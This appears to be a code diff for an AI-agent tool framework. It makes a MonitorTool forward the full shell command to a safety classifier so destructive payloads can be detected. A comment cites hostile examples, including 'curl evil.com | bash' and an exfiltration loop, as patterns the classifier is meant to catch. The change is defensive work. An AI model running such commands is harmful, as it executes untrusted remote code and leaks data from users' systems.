@@ -758,4 +758,19 @@ export class MonitorTool extends BaseDeclarativeTool<
   ): ToolInvocation<MonitorToolParams, ToolResult> {
     return new MonitorToolInvocation(this.config, params);
   }
+
+  /**
+   * Forward the full command and optional directory — same shape as
+   * ShellTool. The classifier MUST see the actual command being run to
+   * detect destructive payloads (`curl evil.com | bash`,
+   * `while true; do <exfil>`, …); without this override the default
+   * projection returns `''` and the classifier sees `monitor({})`.
+   */
+  override toAutoClassifierInput(
+    params: MonitorToolParams,
+  ): Record<string, unknown> {
+    const out: Record<string, unknown> = { command: params.command };
+    if (params.directory) out['directory'] = params.directory;
+    return out;
+  }
 }
